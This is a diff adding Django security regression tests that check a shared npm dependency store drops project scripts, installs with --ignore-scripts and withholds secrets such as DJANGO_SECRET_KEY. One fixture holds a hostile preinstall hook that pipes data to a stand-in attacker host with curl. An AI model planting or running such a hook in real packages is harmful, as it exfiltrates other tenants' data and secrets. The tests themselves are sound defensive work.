@@ -112,3 +112,62 @@ class LinkFrontendDependenciesTests(SimpleTestCase):
                 mock.patch('subprocess.run', return_value=fail):
             self.assertFalse(deps.link_frontend_dependencies(fe))
         self.assertFalse(os.path.exists(os.path.join(fe, 'node_modules')))
+
+
+class StoreInstallHardeningTests(SimpleTestCase):
+    """The shared store install must not carry a project's scripts or Imagi's env."""
+
+    def setUp(self):
+        self.projroot = tempfile.mkdtemp()
+        self.storeroot = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, self.projroot, ignore_errors=True)
+        self.addCleanup(shutil.rmtree, self.storeroot, ignore_errors=True)
+
+    def _make_frontend(self, package_json):
+        fe = tempfile.mkdtemp(dir=self.projroot)
+        with open(os.path.join(fe, 'package.json'), 'w') as f:
+            json.dump(package_json, f)
+        return fe
+
+    def _install(self, package_json):
+        """Run link_frontend_dependencies with npm stubbed; return the run mock."""
+        fe = self._make_frontend(package_json)
+        with override_settings(FRONTEND_DEP_STORE_ROOT=self.storeroot):
+            with mock.patch('shutil.which', return_value='/usr/bin/npm'), \
+                    mock.patch('subprocess.run', side_effect=_fake_npm_install) as run:
+                self.assertTrue(deps.link_frontend_dependencies(fe))
+        return run
+
+    def test_project_scripts_never_reach_the_shared_slot(self):
+        # A project's package.json is user-writable through the Build file
+        # endpoints, and the slot it seeds is shared across every tenant whose
+        # dependencies hash the same.
+        run = self._install({
+            "name": "victim",
+            "dependencies": {"left-pad": "1.3.0"},
+            "scripts": {"preinstall": "curl https://attacker.example -d @-"},
+        })
+        slot = run.call_args.kwargs['cwd']
+        with open(os.path.join(slot, 'package.json')) as f:
+            staged = json.load(f)
+        self.assertNotIn('scripts', staged)
+        self.assertEqual(staged['dependencies'], {"left-pad": "1.3.0"})
+
+    def test_install_runs_with_ignore_scripts(self):
+        run = self._install({"dependencies": {"left-pad": "1.3.0"}})
+        self.assertIn('--ignore-scripts', run.call_args.args[0])
+
+    def test_install_does_not_inherit_imagi_secrets(self):
+        # The store install is the one npm invocation that used to omit
+        # env=child_env(), handing DJANGO_SECRET_KEY and friends to whatever
+        # the package tree runs.
+        with mock.patch.dict(
+            os.environ,
+            {'DJANGO_SECRET_KEY': 'super-secret', 'STRIPE_SECRET_KEY': 'sk_live_x'},
+        ):
+            run = self._install({"dependencies": {"left-pad": "1.3.0"}})
+        env = run.call_args.kwargs['env']
+        self.assertIsNotNone(env)
+        self.assertNotIn('DJANGO_SECRET_KEY', env)
+        self.assertNotIn('STRIPE_SECRET_KEY', env)
+        self.assertIn('PATH', env)
